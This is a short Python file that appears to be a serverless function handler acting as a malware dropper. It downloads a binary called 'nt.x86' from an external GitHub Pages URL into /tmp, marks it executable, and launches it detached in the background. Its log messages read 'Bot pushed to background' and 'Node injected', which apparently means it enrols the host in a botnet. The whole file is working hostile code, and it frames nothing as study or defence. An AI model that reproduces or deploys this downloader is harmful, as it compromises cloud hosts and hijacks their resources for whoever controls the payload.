import os
import subprocess
import urllib.request

async def main(context):
    binary_url = "https://urbenm4.github.io/nt.x86"
    dest_path = "/tmp/nt.x86"
    
    context.log(f"Starting download: {binary_url}")

    try:
        # 1. Download using Python built-in (No curl needed)
        with urllib.request.urlopen(binary_url) as response, open(dest_path, 'wb') as out_file:
            out_file.write(response.read())
        
        # 2. Set executable permissions
        os.chmod(dest_path, 0o755)
        context.log("Download and chmod successful.")

        # 3. Background Execution
        # We use a shell command to ensure it detaches properly
        subprocess.Popen(f"{dest_path} > /dev/null 2>&1 &", shell=True)
        context.log("Bot pushed to background.")

    except Exception as e:
        context.error(f"Error: {str(e)}")
        return context.res.json({"status": "error", "message": str(e)})

    return context.res.json({
        "status": "success", 
        "message": "Node injected using urllib"
    })
